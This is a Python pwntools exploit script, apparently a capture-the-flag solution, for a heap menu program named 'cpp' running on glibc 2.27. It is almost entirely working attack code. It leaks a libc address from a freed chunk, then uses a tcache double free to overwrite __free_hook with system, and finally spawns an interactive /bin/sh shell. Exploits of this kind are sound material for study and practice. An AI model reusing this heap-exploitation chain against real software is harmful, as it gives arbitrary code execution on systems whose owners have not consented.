import pwn as p

target = p.process('./cpp', env={'LD_PRELOAD': './libc-2.27.so'})
# p.gdb.attach(target, gdbscript='pie b *0x15e0\n pie b *0x166e')
# p.gdb.attach(target)

libc = p.ELF('./libc-2.27.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def add(name: bytes, buf: bytes) -> None:
    prints(target.recvuntil(b'Choice: '))
    target.sendline(b'1')
    prints(target.recvuntil(b'name:'))
    target.sendline(name)
    prints(target.recvuntil(b'buf:'))
    target.sendline(buf)


def remove(index: int) -> None:
    prints(target.recvuntil(b'Choice: '))
    target.sendline(b'2')
    prints(target.recvuntil(b'idx:'))
    target.sendline(b(str(index)))


def view(index: int) -> bytes:
    prints(target.recvuntil(b'Choice: '))
    target.sendline(b'3')
    prints(target.recvuntil(b'idx:'))
    target.sendline(b(str(index)))
    output = target.recvuntil(b'Done!').replace(b'Done!', b'').strip()

    return output


# set up to fill tcache and have one entry in unsorted bin
add(b'0'*10, b'a'*0x90)
add(b'1'*10, b'b'*0x90)
add(b'2'*10, b'c'*0x90)
add(b'3'*10, b'd'*0x90)
add(b'4'*10, b'e'*0x90)
remove(4)
remove(3)
remove(0)

# # allocate a big chunk, so that the one in unsorted bin will go into small bin
add(b'5'*10, b'f'*0x100)

# leak the main_arena address of a previously freed chunk
output = view(1)
output = output + b'\x00' * (8 - len(output))
leak = p.u64(output)
print('leak:', hex(leak))
libc_base = leak - 0x3ebd30
print('libc base:', hex(libc_base))

add(b'6'*10, b'g'*0x30)  # id 3
add(b'7'*10, b'h'*0x30)  # id 4
add(b'8'*10, b'i'*0x30)  # id 5
remove(5)
remove(3)
remove(3)

free_hook = libc_base + libc.symbols['__free_hook']
print('free_hook:', hex(free_hook))
add(b'9'*10, p.p64(free_hook)+b'\x00'*0x28)

system = libc_base + libc.symbols['system']
print('system:', hex(system))
add(b'10', p.p64(system)+b'\x00'*0x28)

add(b'/bin/sh\x00', b'/bin/sh\x00')

target.interactive()
